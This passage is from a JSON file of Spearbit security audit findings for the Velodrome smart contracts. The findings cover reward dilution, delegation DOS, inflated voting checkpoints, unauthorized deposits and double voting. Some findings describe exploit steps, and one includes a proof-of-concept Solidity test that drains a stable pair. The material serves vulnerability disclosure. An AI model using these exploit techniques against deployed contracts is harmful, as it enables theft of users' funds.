        "body": "Rewards are allocated on a per epoch basis to users in proportion to their total deposited amount. Because the balance and total supply used for rewards is based on _currTs % WEEK + WEEK, the values will not represent the end of the current epoch, but instead the first second of the next epoch. As a result, if a user deposits at any epoch boundary, their deposited amount will actually contribute to the check- pointed total supply of the prior epoch. This leads to a few issues which are detailed below:  Users who deposit in the first second of the next epoch will dilute the total supply for the prior epoch while not being eligible to claim rewards for that same epoch. Consequently, some rewards will be left unclaimed and locked within the contract as the tokenRewardsPerEpoch mapping is used to store reward amounts so unclaimed rewards will not roll over to future epochs.  Users can also avoid zero numEpochs by depositing a negligible amount at an earlier epoch for multiple ac- counts before attempting to deposit a larger amount at _currTs % WEEK == 0. The same user can withdraw their deposit from the VotingEscrow contract with the claimed rewards and re-deposit these funds into an- other account in the same block. They are able to abuse this issue to claim all rewards allocated to each epoch.  In a similar fashion, reward distributions that are weighted by users' votes in the Voter contract can suffer the same issue as outlined above. If the attacker votes some negligible amount on various pools using several accounts, they can increase the vote, claim, reset the vote and re-vote via another account to claim rewards multiple times. The math below shows that _currTs + WEEK is indeed the first second of the next epoch and not the last of the prior epoch. 6 uint256 internal constant WEEK = 7 days; function epochStart(uint256 timestamp) internal pure returns (uint256) { return timestamp - (timestamp % WEEK); } epochStart(123) Type: uint Hex: 0x0 Decimal: 0 epochStart(100000000) Type: uint Hex: 0x5f2b480 Decimal: 99792000 WEEK Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(1 + WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(0 + WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(WEEK - 1) Type: uint Hex: 0x0 Decimal: 0",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "DOS attack by delegating tokens at MAX_DELEGATES = 1024",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Any user can delegate the balance of the locked NFT amount to anyone by calling delegate. As the delegated tokens are maintained in an array that's vulnerable to DOS attack, the VotingEscrowhas a safety check of MAX_DELEGATES = 1024 preventing an address from having a huge array. Given the current implementation, any user with 1024 delegated tokens takes approximately 23M gas to transfer/burn/mint a token. However, the current gas limit of the op chain is 15M. (ref: Op-scan)  The current votingEscrow has a limit of MAX_DELEGATES=1024. it's approx 23M to transfer/withdraw a token when there are 1024 delegated voting on a token.  It's cheaper to delegate from an address with a shorter token list to an address with a longer token list. => If someone trying to attack a victim's address by creating a new address, a new lock, and delegating to the victim. By the time the attacker hit the gas limit, the victim can not withdraw/transfer/delegate.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Inflated voting balance due to duplicated veNFTs within a checkpoint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Note: This issue affects VotingEscrow._moveTokenDelegates and VotingEscrow._moveAllDele- gates functions A checkpoint can contain duplicated veNFTs (tokenIDs) under certain circumstances leading to double counting of voting balance. Malicious users could exploit this vulnerability to inflate the voting balance of their accounts and participate in governance and gauge weight voting, potentially causing loss of assets or rewards for other users if the inflated voting balance is used in a malicious manner (e.g. redirect rewards to gauges where attackers have a vested interest). Following is the high-level pseudo-code of the existing _moveTokenDelegates function, which is crucial for under- standing the issue. 1. Assuming moving tokenID=888 from Alice to Bob. 2. Source Code Logic (Moving tokenID=888 out of Alice)  Fetch the existing Alice's token IDs and assign them to srcRepOld  Create a new empty array = srcRepNew  Copy all the token IDs in srcRepOld to srcRepNew except for tokenID=888 3. Destination Code Logic (Moving tokenID=888 into Bob)  Fetch the existing Bobs' token IDs and assign them to dstRepOld  Create a new empty array = dstRepNew  Copy all the token IDs in dstRepOld to dstRepNew  Copy tokenID=888 to dstRepNew The existing logic works fine as long as a new empty array (srcRepNew OR dstRepNew) is created every single time. The code relies on the _findWhatCheckpointToWrite function to return the index of a new checkpoint. function _moveTokenDelegates( ..SNIP.. uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; However, the problem is that the _findWhatCheckpointToWrite function does not always return the index of a new checkpoint (Refer to Line 1357 below). It will return the last checkpoint if it has already been written once within the same block. function _findWhatCheckpointToWrite(address account) internal view returns (uint32) { uint256 _blockNumber = block.number; uint32 _nCheckPoints = numCheckpoints[account]; if (_nCheckPoints > 0 && _checkpoints[account][_nCheckPoints - 1].fromBlock == _blockNumber) { return _nCheckPoints - 1; } else { return _nCheckPoints; } } If someone triggers the _moveTokenDelegates more than once within the same block (e.g. perform NFT transfer twice to the same person), the _findWhatCheckpointToWrite function will return a new checkpoint in the first transfer but will return the last/previous checkpoint in the second transfer. This will cause the move token delegate logic to be off during the second transfer. 9 First Transfer at Block 1000 Assume the following states: numCheckpoints[Alice] = 1 _checkpoints[Alice][0].tokenIds = [n1, n2] <== Most recent checkpoint numCheckpoints[Bob] = 1 _checkpoints[Bob][0].tokenIds = [n3] <== Most recent checkpoint To move tokenID=2 from Alice to Bob, the _moveTokenDelegates(Alice, Bob, n2) function will be triggered. The _findWhatCheckpointToWrite will return the index of 1 which points to a new array. The end states of the first transfer will be as follows: numCheckpoints[Alice] = 2 _checkpoints[Alice][0].tokenIds = [n1, n2] _checkpoints[Alice][1].tokenIds = [n1] <== Most recent checkpoint numCheckpoints[Bob] = 2 _checkpoints[Bob][0].tokenIds = [n3] _checkpoints[Bob][1].tokenIds = [n2, n3] <== Most recent checkpoint Everything is working fine at this point in time. Second Transfer at Block 1000 (same block) To move tokenID=1 from Alice to Bob, the _moveTokenDelegates(Alice, Bob, n1) function will be triggered. This time round since the last checkpoint block is the same as the current block, the _findWhatCheckpointToWrite function will return the last checkpoint instead of a new checkpoint. The srcRepNew and dstRepNew will end up referencing the old checkpoint instead of a new checkpoint. As such, the srcRepNew and dstRepNew array will reference back to the old checkpoint _checkpoints[Alice][1].tokenIds and _checkpoints[Bob][1].tokenIds respectively. The end state of the second transfer will be as follows: numCheckpoints[Alice] = 3 _checkpoints[Alice][0].tokenIds = [n1, n2] _checkpoints[Alice][1].tokenIds = [n1] <== Most recent checkpoint numCheckpoints[Bob] = 3 _checkpoints[Bob][0].tokenIds = [n3] _checkpoints[Bob][1].tokenIds = [n2, n3, n2, n3, n1] <== Most recent checkpoint Four (4) problems could be observed from the end state: 1. The numCheckpoints is incorrect. Should be two (2) instead to three (3) 2. TokenID=1 has been added to Bob's Checkpoint, but it has not been removed from Alice's Checkpoint 3. Bob's Checkpoint contains duplicated tokenIDs (e.g. there are two TokenID=2 and TokenID=3) 4. TokenID is not unique (e.g. TokenID appears more than once) Since the token IDs within the checkpoint will be used to determine the voting power, the voting power will be inflated in this case as there will be a double count of certain NFTs. function _moveTokenDelegates( ..SNIP.. uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; 10 Additional Comment about nextSrcRepNum variable and _findWhatCheckpointToWrite function In Line 1320 below, the code wrongly assumes that the _findWhatCheckpointToWrite function will always return the index of the next new checkpoint. The _findWhatCheckpointToWrite function will return the index of the latest checkpoint instead of a new one if block.number == checkpoint.fromBlock. function _moveTokenDelegates( address srcRep, address dstRep, uint256 _tokenId ) internal { if (srcRep != dstRep && _tokenId > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256[] storage srcRepOld = srcRepNum > 0 ? _checkpoints[srcRep][srcRepNum - 1].tokenIds : _checkpoints[srcRep][0].tokenIds; uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; Additional Comment about numCheckpoints In Line 1330 below, the function computes the new number of checkpoints by incrementing the srcRepNum by one. However, this is incorrect because if block.number == checkpoint.fromBlock, then the number of checkpoints remains the same and does not increment. function _moveTokenDelegates( address srcRep, address dstRep, uint256 _tokenId ) internal { if (srcRep != dstRep && _tokenId > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256[] storage srcRepOld = srcRepNum > 0 ? _checkpoints[srcRep][srcRepNum - 1].tokenIds : _checkpoints[srcRep][0].tokenIds; uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; // All the same except _tokenId for (uint256 i = 0; i < srcRepOld.length; i++) { uint256 tId = srcRepOld[i]; if (tId != _tokenId) { srcRepNew.push(tId); } } numCheckpoints[srcRep] = srcRepNum + 1; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Rebase rewards cannot be claimed after a veNFT expires",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Note: This issue affects both the RewardsDistributor.claim and RewardsDistributor.claimMany functions A user will claim their rebase rewards via the RewardsDistributor.claim function, which will trigger the VotingE- scrow.deposit_for function. function claim(uint256 _tokenId) external returns (uint256) { if (block.timestamp >= timeCursor) _checkpointTotalSupply(); uint256 _lastTokenTime = lastTokenTime; _lastTokenTime = (_lastTokenTime / WEEK) * WEEK; uint256 amount = _claim(_tokenId, _lastTokenTime); if (amount != 0) { IVotingEscrow(ve).depositFor(_tokenId, amount); tokenLastBalance -= amount; } return amount; } Within the VotingEscrow.deposit_for function, the require statement at line 812 below will verify that the veNFT performing the claim has not expired yet. function depositFor(uint256 _tokenId, uint256 _value) external nonReentrant { LockedBalance memory oldLocked = _locked[_tokenId]; require(_value > 0, \"VotingEscrow: zero amount\"); require(oldLocked.amount > 0, \"VotingEscrow: no existing lock found\"); require(oldLocked.end > block.timestamp, \"VotingEscrow: cannot add to expired lock, withdraw\"); _depositFor(_tokenId, _value, 0, oldLocked, DepositType.DEPOSIT_FOR_TYPE); } If a user claims the rebase rewards after their veNFT's lock has expired, the VotingEscrow.depositFor function will always revert. As a result, the accumulated rebase rewards will be stuck in the RewardsDistributor contract and users will not be able to retrieve them.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Claimed rebase rewards of managed NFT are not compounded within LockedManagedReward",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Rebase rewards of a managed NFT should be compounded within the LockedManagedRewards contract. However, this was not currently implemented. When someone calls the RewardsDistributor.claim with a managed NFT, the claimed rebase rewards will be locked via the VotingEscrow.depositFor function (Refer the VotingEscrow.depositFor function fails to notify the LockedManagedRewards contract of the incoming rewards. Thus, the rewards do not accrue in the LockedManagedRewards. to Line 277 below). However, function claim(uint256 _tokenId) external returns (uint256) { if (block.timestamp >= timeCursor) _checkpointTotalSupply(); uint256 _lastTokenTime = lastTokenTime; _lastTokenTime = (_lastTokenTime / WEEK) * WEEK; uint256 amount = _claim(_tokenId, _lastTokenTime); if (amount != 0) { IVotingEscrow(ve).depositFor(_tokenId, amount); tokenLastBalance -= amount; } return amount; } One of the purposes of the LockedManagedRewards contract is to accrue rebase rewards claimed by the man- aged NFT so that the users will receive their pro-rata portion of the rebase rewards based on their contribu- tion to the managed NFT when they withdraw their normal NFTs from the managed NFT via the VotingE- scrow.withdrawManaged function. 13 /// @inheritdoc IVotingEscrow function withdrawManaged(uint256 _tokenId) external nonReentrant { ..SNIP.. uint256 _reward = IReward(_lockedManagedReward).earned(address(token), _tokenId); ..SNIP.. // claim locked rewards (rebases + compounded reward) address[] memory rewards = new address[](1); rewards[0] = address(token); IReward(_lockedManagedReward).getReward(_tokenId, rewards); If the rebase rewards are not accrued in the LockedManagedRewards, users will not receive their pro-rata portion of the rebase rewards during withdrawal.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Malicious users could deposit normal NFTs to a managed NFT on behalf of others without their permission",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The VotingEscrow.depositManaged function did not verify that the caller (msg.sender) is the owner of the _tokenId. As a result, a malicious user can deposit normal NFTs to a managed NFT on behalf of others without their permission. function depositManaged(uint256 _tokenId, uint256 _mTokenId) external nonReentrant { require(escrowType[_mTokenId] == EscrowType.MANAGED, \"VotingEscrow: can only deposit into managed nft\"); ,! require(!deactivated[_mTokenId], \"VotingEscrow: inactive managed nft\"); require(escrowType[_tokenId] == EscrowType.NORMAL, \"VotingEscrow: can only deposit normal nft\"); require(!voted[_tokenId], \"VotingEscrow: nft voted\"); require(ownershipChange[_tokenId] != block.number, \"VotingEscrow: flash nft protection\"); require(_balanceOfNFT(_tokenId, block.timestamp) > 0, \"VotingEscrow: no balance to deposit\"); ..SNIP.. The owner of a normal NFT will have their voting balance transferred to a malicious managed NFT, resulting in loss of rewards and voting power for the victim. Additionally, a malicious owner of a managed NFT could aggregate 14 voting power of the victim's normal NFTs, and perform malicious actions such as stealing the rewards from the victims or use its inflated voting power to pass malicious proposals.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "First liquidity provider of a stable pair can DOS the pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The invariant k of a stable pool is calculated as follows Pair.sol#L505 function _k(uint256 x, uint256 y) internal view returns (uint256) { if (stable) { uint256 _x = (x * 1e18) / decimals0; uint256 _y = (y * 1e18) / decimals1; uint256 _a = (_x * _y) / 1e18; uint256 _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18); return (_a * _b) / 1e18; // x3y+y3x >= k } else { return x * y; // xy >= k } } The value of _a = (x * y ) / 1e18 = 0 due to rounding error when x*y < 1e18. The rounding error can lead to the invariant k of stable pools equals zero, and the trader can steal whatever is left in the pool. The first liquidity provider can DOS the pair by: 1.mint a small amount of liquidity to the pool, 2. Steal whatever is left in the pool, 3. Repeat step 1, and step 2 until the overflow of the total supply. To prevent the issue of rounding error, the reserve of a pool should never go too small. The mint function which was borrowed from uniswapV2 has a minimum liquidity check of sqrt(a * b) > MINIMUM_LIQUIDITY; This, however, isn't safe enough to protect the invariant formula of stable pools. Pair.sol#L344-L363 uint256 internal constant MINIMUM_LIQUIDITY = 10**3; // ... function mint(address to) external nonReentrant returns (uint256 liquidity) { // ... uint256 _amount0 = _balance0 - _reserve0; uint256 _amount1 = _balance1 - _reserve1; uint256 _totalSupply = totalSupply(); if (_totalSupply == 0) { liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY; //@audit what about the fee? _mint(address(1), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens - ,! cannot be address(0) // ... } This is the POC of an exploit extended from Pair.t.sol 15 contract PairTest is BaseTest { // ... function drainPair(Pair pair, uint initialFraxAmount, uint initialDaiAmount) internal { DAI.transfer(address(pair), 1); uint amount0; uint amount1; if (address(DAI) < address(FRAX)) { amount0 = 0; amount1 = initialFraxAmount - 1; } else { amount1 = 0; amount0 = initialFraxAmount - 1; } pair.swap(amount0, amount1, address(this), new bytes(0)); FRAX.transfer(address(pair), 1); if (address(DAI) < address(FRAX)) { amount0 = initialDaiAmount; // initialDaiAmount + 1 - 1 amount1 = 0; } else { amount1 = initialDaiAmount; // initialDaiAmount + 1 - 1 amount0 = 0; } pair.swap(amount0, amount1, address(this), new bytes(0)); } function testDestroyPair() public { deployCoins(); deal(address(DAI), address(this), 100 ether); deal(address(FRAX), address(this), 100 ether); deployFactories(); Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true)); for(uint i = 0; i < 10; i++) { DAI.transfer(address(pair), 10_000_000); FRAX.transfer(address(pair), 10_000_000); // as long as 10_000_000^2 < 1e18 uint liquidity = pair.mint(address(this)); console.log(\"pair:\", address(pair), \"liquidity:\", liquidity); console.log(\"total liq:\", pair.balanceOf(address(this))); drainPair(pair, FRAX.balanceOf(address(pair)) , DAI.balanceOf(address(pair))); console.log(\"DAI balance:\", DAI.balanceOf(address(pair))); console.log(\"FRAX balance:\", FRAX.balanceOf(address(pair))); require(DAI.balanceOf(address(pair)) == 1, \"should drain DAI balance\"); require(FRAX.balanceOf(address(pair)) == 2, \"should drain FRAX balance\"); } DAI.transfer(address(pair), 1 ether); FRAX.transfer(address(pair), 1 ether); vm.expectRevert(); pair.mint(address(this)); } }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Certain functions are unavailable after opting in to the \"auto compounder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Certain features (e.g., delegation, governance voting) of a veNFT would not be available if the veNFT is transferred to the auto compounder. Let x be a managed veNFT. When an \"auto compounder\" is created, ownership of x is transferred to the AutoCom- pounder contract, and any delegation within x is cleared. The auto compounder can perform gauge weight voting using x via the provided AutoCompounder.vote function. However, it loses the ability to perform any delegation with x because the AutoCompounder contract does not contain a function that calls the VotingEscrow.delegate function. Only the owner of x, the AutoCompounder contract, can call the VotingEscrow.delegate function. x also loses the ability to vote on governance proposals as the existing AutoCompounder contract does not support this feature. Once the owner of the managed NFTs has opted in to the \"auto compounder,\" it is not possible for them to subsequently \"opt out.\" Consequently, if they need to exercise delegation and governance voting, they will be unable to do so, exacerbating the impact. 17",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Claimable gauge distributions are locked when killGauge is called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "When a gauge is killed, the claimable[_gauge] key value is cleared. Because any rewards received by the Voter contract are indexed and distributed in proportion to each pool's weight, this claimable amount is permanently locked within the contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Bribe and fee token emissions can be gamed by users",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "A user may vote or reset their vote once per epoch. Votes persist across epochs and once a user has distributed their votes among their chosen pools, the poke() function may be called by any user to update the target user's decayed veNFT token balance. However, the poke() function is not hooked into any of the reward distribution contracts. As a result, a user is incentivized to vote as soon as they create their lock and avoid re-voting in subsequent epochs. The amount deposited via Reward._deposit() does not decay linearly as how it is defined under veToken mechanics. Therefore, users could continue to earn trading fees and bribes even after their lock has expired. Simultaneously, users can poke() other users to lower their voting weight and maximize their own earnings.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Compromised or malicious owner can drain the VotingEscrow contract of VELO tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The FactoryRegistry contract is an Ownable contract with the ability to control the return value of the managedRewardsFactory() function. As such, whenever createManagedLockFor() is called in VotingEscrow, the FactoryRegistry contract queries the managedRewardsFactory() function and subsequently calls createRe- wards() on this address. If ownership of the FactoryRegistry contract is compromised or malicious, the createRewards() external call can return any arbitrary _lockedManagedReward address which is then given an infinite token approval. As a result, it's possible for all locked VELO tokens to be drained and hence, this poses a significant centralization risk to the protocol.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unsafe casting in RewardsDistributor leads to underflow of veForAt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Solidity does not revert when casting a negative number to uint. Instead, it underflows to a large number. In the RewardDistributor contract, the balance of a token at specific time is calculated as follows IVotingEscrow.Point memory pt = IVotingEscrow(_ve).userPointHistory(_tokenId, epoch); Math.max(uint256(int256(pt.bias - pt.slope * (int128(int256(_timestamp - pt.ts))))), 0); This supposes to return zero when the calculated balance is a negative number. However, it underflows to a large number. This would lead to incorrect reward distribution if third-party protocols depend on this function, or when further updates make use of this codebase.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Proposals can be griefed by front-running and canceling",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because the Governor uses OZ's Implementation, a griefter can front-run a valid proposal with the same settings and then immediately cancel it. You can avoid the grief by writing a macro contract that generates random descriptions to avoid the front-run. See: code-423n4/2022-09-nouns-builder-findings#182.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "pairFor does not correctly sort tokens when overriding for SinkConverter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The router will always search for pairs by sorting tokenA and TokenB. Notably, for the velo and Velo2 pair, the Router will not perform the sorting 21 //Router.sol#L69-L73 if (factory == defaultFactory) { if ((tokenA == IPairFactory(defaultFactory).velo()) && (tokenB == ,! IPairFactory(defaultFactory).veloV2())) { return IPairFactory(defaultFactory).sinkConverter(); } } Meaning that the pair for Velo -> Velo2 will be the Sink but the pair for Velo2 -> Velo will be some other pair. Additionally, you can front-run a call to setSinkConverter() by calling createPair() with the same parameters. How- ever, the respective values for getPair() would be overwritten with the sinkConverter address. This could lead to some weird and unexpected behaviour as we would still have an invalid Pair contract for the v1 and v2 velo tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Inconsistent between balanceOfNFT, balanceOfNFTAt and _balanceOfNFT functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The balanceOfNFT function implements a flash-loan protection that returns zero voting balance if ownershipChange[_tokenId] == block.number. However, this was not consistently applied to the balanceOfNF- TAt and _balanceOfNFT functions. VotingEscrow.sol function balanceOfNFT(uint256 _tokenId) external view returns (uint256) { if (ownershipChange[_tokenId] == block.number) return 0; return _balanceOfNFT(_tokenId, block.timestamp); } As a result, Velodrome or external protocols calling the balanceOfNFT and balanceOfNFTAt external functions will receive different voting balances for the same veNFT depending on which function they called. Additionally, the internal _balanceOfNFT function, which does not have flash-loan protection, is called by the VotingEscrow.getVotes function to compute the voting balance of an account. The VotingEscrow.getVotes function appears not to be used in any in-scope contracts, however, this function might be utilized by some exter- nal protocols or off-chain components to tally the votes. If that is the case, a malicious user could flash-loan the veNFTs to inflate the voting balance of their account.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Nudge check will break once limit is reached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because you're checking both sides, once oldRate reaches the MAX_RATE, every new nudge call will revert. Meaning that if _newRate ever get's to MAXIMUM_TAIL_RATE or MINIMUM_TAIL_RATE, nudge will stop working.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ownershipChange can be sidestepped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The check there is to prevent adding to managed after a transfer from or creation require(ownershipChange[_tokenId] != block.number, \"VotingEscrow: flash nft protection\"); However, it doesn't prevent adding and removing from other managed tokens, merging, or splitting. For this reason, we can sidestep the lock by splitting Because ownershipChange is updated exclusively on _transferFrom, we can side-step it being set by splitting the lock into a new one which will not have the lock.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The fromBlock variable of a checkpoint is not initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "A checkpoint contains a fromBlock variable which stores the block number the checkpoint is created. /// @notice A checkpoint for marking delegated tokenIds from a given block struct Checkpoint { uint256 fromBlock; uint256[] tokenIds; } However, it was found that the fromBlock variable of a checkpoint was not initialized anywhere in the codebase. Therefore, any function that relies on the fromBlock of a checkpoint will break. The VotingEscrow._findWhatCheckpointToWrite and VotingEscrow.getPastVotesIndex functions were found to rely on the fromBlock variable of a checkpoint for computation. The following is a list of functions that calls these two affected functions. _findWhatCheckpointToWrite -> _moveTokenDelegates -> _transferFrom _findWhatCheckpointToWrite -> _moveTokenDelegates -> _mint _findWhatCheckpointToWrite -> _moveTokenDelegates -> _burn _findWhatCheckpointToWrite -> _moveAllDelegates -> _delegate -> delegate/delegateBySig getPastVotesIndex -> getTokenIdsAt getPastVotesIndex -> getPastVotes -> GovernorSimpleVotes._getVotes Instance 1 - VotingEscrow._findWhatCheckpointToWrite function The VotingEscrow._findWhatCheckpointToWrite function verifies if the fromBlock of the latest checkpoint of an account is equal to the current block number. If true, the function will return the index number of the last checkpoint. function _findWhatCheckpointToWrite(address account) internal view returns (uint32) { uint256 _blockNumber = block.number; uint32 _nCheckPoints = numCheckpoints[account]; if (_nCheckPoints > 0 && _checkpoints[account][_nCheckPoints - 1].fromBlock == _blockNumber) { return _nCheckPoints - 1; } else { return _nCheckPoints; } } As such, this function does not work as intended and will always return the index of a new checkpoint. Instance 2 - VotingEscrow.getPastVotesIndex function The VotingEscrow.getPastVotesIndex function relies on the fromBlock of the latest checkpoint for optimization purposes. If the request block number is the most recently updated checkpoint, it will return the latest index immediately and skip the binary search. Since the fromBlock variable is not populated, the optimization will not work. 24 function getPastVotesIndex(address account, uint256 blockNumber) public view returns (uint32) { uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } // First check most recent balance if (_checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return (nCheckpoints - 1); } // Next check implicit zero balance if (_checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow Checkpoint storage cp = _checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return center; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return lower; }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Double voting by shifting the voting power between managed and normal NFTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Owners of normal NFTs and managed NFTs could potentially collude to double vote, which affects the fairness of the gauge weight voting. A group of malicious veNFT owners could exploit this and use the inflated voting balance to redirect the VELO emission to gauges where they have a vested interest, causing losses to other users. The following shows that it is possible to increase the weight of a pool by 2000 with a 1000 voting balance within a single epoch by shifting the voting power between managed and normal NFTs. For simplicity's sake, assume the following  Alice is the owner of a managed NFT (tokenID=888)  Bob is the owner of a normal NFT (tokenID=999)  Alice's managed NFT (tokenID=888) only consists of one (1) normal NFT (tokenID=999) that belongs to Bob being locked up. The following steps are executed within the same epoch. At the start, the state is as follows:  Voting power of Alice's managed NFT (tokenID=888) is 1000 25  The 1000 voting came from the normal NFT (tokenID=999) during the deposit  weights[_tokenId][_mTokenId] = _weight | weights[999][888] = 1000;  Voting power of Bob's normal NFT (tokenID=999) is zero (0)  Weight of Pool X = 0 Alice calls Voter.vote function with his managed NFT (tokenID=888), and increases the weight of Pool X by 1000. Subsequently, the lastVoted[_tokenId] = _timestamp at Line 222 in the Voter.vote function will be set, and the onlyNewEpoch modifier will ensure Alice cannot use the same managed NFT (tokenID=888) to vote again in the current epoch. However, Bob could call the VotingEscrow.withdrawManaged to withdraw his normal NFT (tokenID=999) from the managed NFT (tokenID=888). Within the function, it will call the internal _checkpoint function to \"transfer\" the voting power from managed NFT (tokenID=888) to normal NFT (tokenID=999). At this point, the state is as follows:  Voting power of Alice's managed NFT (tokenID=888) is zero (0)  Voting power of Bob's normal NFT (tokenID=999) is 1000  Weight of Pool X = 1000 Bob calls Voter.vote function with his normal NFT (tokenID=999) and increases the weight of Pool X by 1000. Since normal NFT (tokenID=999) has not voted in the current epoch, it is allowed to vote. The weight of Pool X becomes 2000. It was observed that a mechanism is in place to punish and disincentivize malicious behaviors from a managed NFT owner. The protocol's emergency council could deactivate Managed NFTs involved in malicious activities via the VotingEscrow.setManagedState function. In addition, the ability to create a managed NFT is restricted to only an authorized manager and protocol's governor. These factors help to mitigate some risks related to this issue to a certain extent.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "MetaTX is using the incorrect Context",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Throughout the codebase, the code uses Context for _msgSender() The implementation chosen will resolve each _msgSender() to msg.sender which is inconsistent with the goal of allowing MetaTX.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "depositFor function should be restricted to approved NFT types",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
